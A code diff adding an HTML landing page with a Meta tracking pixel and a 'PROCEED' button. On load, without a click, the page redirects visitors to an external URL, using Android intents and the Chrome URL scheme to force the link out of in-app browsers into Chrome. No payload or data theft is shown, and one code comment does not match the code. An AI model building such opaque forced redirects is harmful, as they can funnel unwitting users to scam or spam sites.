@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '32391790390434269');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=32391790390434269&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+  
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title> Celebrating . </title>
+<link rel="shortcut icon" type="image/png" href="" />
+<meta name="og:title" content=" Celebrating. " />
+<meta property="og:description" content="Celebrating." />
+<meta property="og:image" content="" />
+<meta property="og:type" content="website" />
+<meta property="og:updated_time" content="1440432930" />
+<style>Click here to continue...
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+html, body {
+height: 100%;
+background: #ffffff;
+}
+
+body {
+display: flex;
+align-items: center;
+justify-content: center;
+font-family: -apple-system, BlinkMacSystemFont, “Segoe UI”, Roboto, Helvetica, Arial, sans-serif;
+}
+
+.container {
+text-align: center;
+}
+
+#proceedBtn {
+padding: 16px 48px;
+font-size: 18px;
+font-weight: 600;
+letter-spacing: 0.5px;
+color: #ffffff;
+background-color: #1a73e8; /* Chrome-blue accent */
+border: none;
+border-radius: 6px;
+cursor: pointer;
+transition: background-color 0.15s ease, transform 0.1s ease;
+}
+
+#proceedBtn:hover {
+background-color: #1558b0;
+}
+
+#proceedBtn:active {
+transform: scale(0.98);
+}
+
+.note {
+margin-top: 16px;
+font-size: 13px;
+color: #888888;
+max-width: 320px;
+}
+</style>
+
+</head>
+<body>
+
+  <div class="container">
+    <button id="proceedBtn">PROCEED</button>
+    <div class="note" id="noteText">Redirecting… tap PROCEED if nothing happens.</div>
+  </div>
+
+  <script>
+    // The final destination the user should land on.
+    // Change this to whatever URL you actually want to send traffic to.
+    var DESTINATION_URL = "https://go.etry.online/seyitinubu.html";
+
+    var btn = document.getElementById("proceedBtn");
+    var note = document.getElementById("noteText");
+
+    function isAndroid() {
+      return /android/i.test(navigator.userAgent);
+    }
+
+    function isIOS() {
+      return /iphone|ipad|ipod/i.test(navigator.userAgent) ||
+             (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
+    }
+
+    function buildAndroidChromeIntent(url) {
+      // Strips the scheme and builds an Android intent:// URL that
+      // explicitly asks the OS to open the link in Chrome.
+      var stripped = url.replace(/^https?:\/\//, "");
+      var scheme = url.indexOf("https://") === 0 ? "https" : "http";
+      return "intent://" + stripped +
+             "#Intent;scheme=" + scheme +
+             ";package=com.android.chrome;end";
+    }
+
+    function goToDestination() {
+      var url = DESTINATION_URL;
+
+      if (isAndroid()) {
+        // Try to force Chrome specifically via an Android intent.
+        // If Chrome isn't installed, Android falls back to the normal link.
+        window.location.href = buildAndroidChromeIntent(url);
+
+        // Fallback in case the intent silently fails
+        // (e.g. some in-app browsers ignore intent:// links).
+        setTimeout(function () {
+          window.location.href = url;
+        }, 1500);
+        return;
+      }
+
+      if (isIOS()) {
+        // iOS has no reliable "force open Chrome" mechanism from a webpage
+        // (Apple restricts default-browser overrides), so we try the
+        // googlechrome:// custom scheme if Chrome is installed, and fall
+        // back to a normal https link (opens in default browser) otherwise.
+        var chromeScheme = url.replace(/^https:\/\//, "googlechromes://")
+                               .replace(/^http:\/\//, "googlechrome://");
+        window.location.href = chromeScheme;
+
+        setTimeout(function () {
+          window.location.href = url;
+        }, 1000);
+        return;
+      }
+
+      // Desktop / everything else: just open the destination normally.
+      // Browsers do not allow a webpage to force a specific desktop
+      // browser to open — this simply navigates the current browser.
+      window.location.href = url;
+    }
+
+    btn.addEventListener("click", goToDestination);
+
+    // Auto-trigger on page load — no click required.
+    // Kept behind a tiny timeout so the page has a chance to fully
+    // render first (some mobile browsers ignore navigation attempts
+    // fired before the document is "settled").
+    window.addEventListener("load", function () {
+      goToDestination();
+    });
+  </script>
+
+</body>
+</html>
